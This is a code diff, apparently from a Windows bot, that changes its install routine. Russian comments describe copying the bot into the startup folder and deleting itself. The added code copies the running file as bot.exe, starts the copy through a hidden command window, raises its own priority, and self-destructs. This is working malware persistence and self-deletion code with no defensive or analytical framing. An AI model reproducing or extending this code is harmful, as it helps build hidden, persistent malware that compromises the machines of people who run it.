@@ -33,16 +33,34 @@ static void install_bot() {
 
 	SHGetFolderPathW(NULL, CSIDL_ALTSTARTUP, NULL, 0, path_newbot);
 	GetModuleFileNameW(NULL, path_bot, sizeof(path_bot) / sizeof(path_bot[0]));
-	wcscat(path_newbot, L"\\  .exe");
+	wcscat(path_newbot, L"\\bot.exe");
 	//если пути ботов - того который должен быть установлен и того кто запустился не совпадают
-	if (path_bot[15] != path_newbot[15] && path_bot[50] != path_newbot[50]) {
+
 		//копирование бота в папку автозагрузки
-		if (CopyFileW(path_bot, path_newbot, TRUE))
+	if (CopyFileW(path_bot, path_newbot, TRUE))
+	{
+		wchar_t cmd_path[MAX_PATH];
+		GetEnvironmentVariableW(L"COMSPEC", cmd_path, MAX_PATH);
+		wsprintfW(cmdParametrs, L"/c \"%ls\"", path_newbot);
+		SHELLEXECUTEINFO sei;
+		sei.cbSize = sizeof(sei);
+		sei.hwnd = 0;
+		sei.lpVerb = L"Open";
+		sei.lpFile = cmd_path;
+		sei.lpParameters = cmdParametrs;
+		sei.lpDirectory = 0;
+		sei.nShow = SW_HIDE;
+		sei.fMask = SEE_MASK_NOCLOSEPROCESS;
+		if (ShellExecuteEx(&sei))
 		{
-			//выполняем самоудаление после успешного копирования
-			do_destroy();
+			SetPriorityClass(sei.hProcess, IDLE_PRIORITY_CLASS); //removing process stops
+			SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS); //accelerate our process
+			SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL); //accelerate our thread
 		}
+		do_destroy();
 	}
+		//выполняем самоудаление в любом случае, можно придумать альтернативы
+	
 }
 
 int main()
